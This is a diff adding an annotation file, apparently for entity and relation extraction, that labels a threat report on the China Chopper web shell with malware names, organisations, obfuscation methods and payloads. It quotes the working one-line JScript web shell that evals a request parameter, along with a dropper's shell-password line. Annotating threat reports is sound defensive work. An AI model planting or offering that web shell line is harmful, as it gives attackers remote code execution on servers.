@@ -1,0 +1,27 @@
+T1	Malware 27 40	China Chopper
+T2	Time 99 110	30 MAR 2015
+T3	Person 112 123	WILLIAM TAN
+T4	Malware 143 160	Chopper Web shell
+T5	Payload 401 474	<%@ Page Language="Jscript"%><%eval(Request.Item[”password"],"unsafe");%>
+R1	hasCharacteristics Arg1:T4 Arg2:T5
+T6	Organization 656 667	CrowdStrike
+T7	Dropper 768 790	System.WebServices.dll
+T8	Payload 953 1010	<% WebServices.InitalizeWebServices ("shell_password");%>
+R2	hasCharacteristics Arg1:T7 Arg2:T8
+T9	Malware 1447 1464	Chopper Web shell
+T10	Malware 1630 1637	Chopper
+T11	Malware 1775 1782	Chopper
+T12	Malware 1855 1862	Chopper
+T13	Software 2029 2037	ChopShop
+T14	Organization 2080 2085	MITRE
+R3	hasProduct Arg1:T14 Arg2:T13
+T15	Software 2130 2138	ChopShop
+T16	Malware 2437 2444	Chopper
+T17	Malware 3531 3538	Chopper
+T18	Obfuscation 3841 3847	base64
+T19	Obfuscation 3851 3854	hex
+R4	hasCharacteristics Arg1:T17 Arg2:T18
+R5	hasCharacteristics Arg1:T17 Arg2:T19
+T20	Malware 4137 4144	Chopper
+T21	Malware 5623 5630	Chopper
+T22	Malware 5666 5673	Chopper
